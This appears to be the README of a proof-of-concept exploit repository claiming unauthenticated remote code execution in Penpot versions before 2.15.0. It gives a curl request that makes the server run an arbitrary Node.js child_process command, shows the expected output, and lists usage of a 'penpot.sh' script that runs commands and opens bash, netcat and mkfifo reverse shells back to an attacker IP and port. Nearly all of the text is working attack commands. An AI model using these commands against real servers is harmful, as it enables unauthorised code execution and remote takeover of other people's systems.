# PenPot-RCE
### Penpot &lt;2.15.0 allows for unathenticated RCE

```
curl -s -X POST http://localhost:4403/execute \
    -H "Content-Type: application/json" \
    -d '{"code":"require(\"child_process\").execSync(\"id\").toString()"}'
```

### Expected Ouput

```
{"success":true,"result":"uid=1000(kali) gid=1000(kali) groups=1000(kali)...\n"}
```

## Quick Usage

### Direct command
  ./penpot.sh -u http://localhost:4403 -c "whoami"

### Bash reverse shell
  ./penpot.sh -u http://localhost:4403 -i 192.168.1.100 -o bash -p 4443

### Netcat reverse shell
  ./penpot.sh -u http://localhost:4403 -i 192.168.1.100 -o nc -p 4443

### MkFIFO reverse shell
  ./penpot.sh -u http://localhost:4403 -i 192.168.1.100 -o mkfifo -p 4443
